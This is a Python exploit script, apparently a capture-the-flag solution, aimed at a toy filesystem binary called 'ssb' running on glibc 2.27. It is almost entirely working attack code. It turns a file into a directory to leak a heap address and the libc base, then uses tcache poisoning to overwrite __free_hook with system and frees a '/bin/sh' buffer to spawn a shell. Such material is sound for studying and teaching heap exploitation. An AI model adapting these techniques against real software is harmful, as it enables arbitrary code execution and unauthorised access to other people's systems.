from ptrlib import *

def add_file(name, size, data):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("name: ")
    sock.sendline(name)
    sock.recvuntil("size: ")
    sock.sendline(str(size))
    if size <= 0x50:
        sock.sendline(data)
    else:
        sock.send(data)

def add_dir(name):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("name: ")
    sock.sendline(name)

def change_directory(name):
    sock.recvuntil("> ")
    sock.sendline("5")
    sock.recvuntil("name: ")
    sock.sendline(name)

def show_file(name):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("name: ")
    sock.sendline(name)
    return sock.recvuntil("\n\n").rstrip()

def remove_file(name):
    sock.recvuntil("> ")
    sock.sendline("6")
    sock.recvuntil("name: ")
    sock.sendline(name)

def list_dir():
    sock.recvuntil("> ")
    sock.sendline("1")
    filelist = []
    while True:
        fname = sock.recvline().rstrip()
        if fname == b'':
            break
        filelist.append(fname)
    return filelist

def which_dir(boundary, offset):
    if boundary[0] < offset < boundary[1]:
        return "dir1"
    elif boundary[1] < offset < boundary[2]:
        return "dir2"
    else:
        return "dir3"

libc = ELF("./libc-2.27.so")
sock = Process("./ssb")
main_arena = 0x3ebc40
delta = 96

# Change file:victim to dir:victim
add_file("killer", 0x50, "AAAA")
add_file("victim", 0x58, "BBBB") # malloced!
remove_file("killer")
add_file("killer", 0x50, b'A' * 0x50 + b'\x01' + b'victim')

# Fill filesystem
add_dir("dir1")
add_dir("dir2")
add_dir("dir3")
add_file("big", 0x500, "a")
add_file("small", 0x58, "b")
offset = 8
boundary = []
for directory in ["dir1", "dir2", "dir3"]:
    change_directory(directory)
    boundary.append(offset)
    for i in range(88):
        if offset < 0x100:
            add_file("{}".format(offset), 0x50, "Hello")
            offset += 1
        else:
            break
    change_directory("..")

# Leak heap address by ptr
change_directory("victim")
addr_heap = 0
for fname in list_dir()[::-1]:
    if fname == b'killer':
        continue
    addr_heap <<= 8
    addr_heap |= int(fname)
assert addr_heap > 0x550000000000
print(list_dir())
change_directory("..")
dump("heap addr = " + hex(addr_heap))

# Change victim->ptr to big->ptr
lsb = addr_heap & 0xff
change_directory("victim")
remove_file(str(lsb))
change_directory("..")
change_directory("dir3")
add_file("consume", 0x50, "Hello")
change_directory("..")
change_directory(which_dir(boundary, (lsb + 0x70) & 0xff))
remove_file(str((lsb + 0x70) & 0xff))
change_directory("..")
change_directory("victim")
add_file("nihao", 0x50, "Hello")
change_directory("..")

# Change dir:victim to file:victim
remove_file("killer")
add_file("killer", 0x50, b'A' * 0x50 + b'\x02' + b'victim')

# Leak libc base
remove_file("big")
libc_base = u64(show_file("victim")) - main_arena - delta
dump("libc base = " + hex(libc_base))

# TCache Poisoning
add_file("big-revived", 0x58, 'Hello')
remove_file("killer")
remove_file("victim")
remove_file("big-revived")
add_file(":)", 0x58, p64(libc_base + libc.symbol("__free_hook")))
add_file(":(", 0x58, "/bin/sh")
add_file(";P", 0x58, p64(libc_base + libc.symbol("system")))

# Get the shell!
remove_file(":(")

sock.interactive()
